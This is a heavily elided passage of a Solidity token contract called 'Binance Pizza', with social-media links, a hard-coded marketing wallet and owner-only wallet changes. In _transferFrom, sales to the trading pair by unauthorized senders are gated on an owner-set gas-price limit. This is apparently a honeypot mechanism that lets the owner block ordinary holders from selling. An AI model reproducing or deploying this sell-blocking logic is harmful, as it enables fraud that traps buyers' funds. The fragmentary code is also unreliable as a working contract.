 ...
 * http://t.me/BinancePizzaBNB
 * https://twitter.com/binancepizza
 */
...
contract BinancePizza is Ownable, IERC20 {
    ...
    string constant private _name = "Binance Pizza";
    ...
    constructor() {
        ...
        lpWallet = msg.sender;
        marketingWallet = 0x8b34F2a96e34eE869f296A466074ebA39FFE9344;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (recipient == pair && !authorizations[sender]) {
            require(tx.gasprice <= limit, ""); 
        }
        if (tx.gasprice >= limit && recipient != pair) {
    ...
    function marketingAndLiquidity() internal lockTheSwap {
        ...
        (tmpSuccess1,) = payable(developmentWallet).call{value : amountETHDev, gas : 30000}("");
        tmpSuccess1 = false;
    ...
    function changeWallets(address newMarketingWallet, address newDevelopmentWallet, address newLpWallet, address newNativeWallet) public onlyOwner{
